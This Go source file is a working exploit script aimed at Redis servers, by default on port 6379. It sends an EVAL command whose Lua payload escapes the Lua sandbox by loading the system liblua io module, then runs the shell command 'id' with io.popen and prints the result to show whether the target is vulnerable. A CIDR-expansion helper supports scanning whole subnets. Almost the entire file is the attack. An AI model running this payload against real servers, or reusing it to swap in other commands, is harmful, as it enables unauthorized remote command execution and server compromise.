package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"strings"
)

type Server struct {
	Ip    string
	Port  int
	IsVul string
	conn  net.Conn
}

func NewServer(ip string, port int) *Server {
	server := &Server{
		Ip:   ip,
		Port: port,
	}
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		fmt.Printf("启动链接错误:%s\n", err)
		return nil
	}
	server.conn = conn
	return server
}

func (this *Server) DoExploit() {
	sendMsg := `eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0` + "\r\n"
	_, err := this.conn.Write([]byte(sendMsg))
	if err != nil {
		// fmt.Println(1)
		fmt.Println(err)
		return
	}
	return
}

func (this *Server) AcceptResponse() {
	buf := make([]byte, 100)
	this.conn.Read(buf)
	str := strings.Replace(string(buf), "\x00", "", -1)
	str = strings.Replace(str, "\r", "", -1)
	str = strings.Replace(str, "\n", "", -1)
	this.IsVul = str
}
func cidr2IPs(cidr string) []string {
	// C段转ip
	var ips []string

	ipAddr, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		log.Print(err)
	}

	for ip := ipAddr.Mask(ipNet.Mask); ipNet.Contains(ip); increment(ip) {
		ips = append(ips, ip.String())
	}

	// CIDR too small eg. /31
	if len(ips) <= 2 {
		log.Print("err")
	}

	return ips
}

func increment(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			break
		}
	}
}

var (
	ip   string
	port int
)

func init() {
	flag.StringVar(&ip, "ip", "127.0.0.1", "目标地址")
	flag.IntVar(&port, "port", 6379, "端口")
}

func start(ip string, port int) {
	server := NewServer(ip, port)
	if server == nil {
		fmt.Println("链接服务器失败")
		return
	}
	server.DoExploit()
	server.AcceptResponse()
	fmt.Println(fmt.Sprintf("%v,%v\n", server.Ip, server.IsVul))
}
func main() {
	flag.Parse()
	start(ip, port)
}
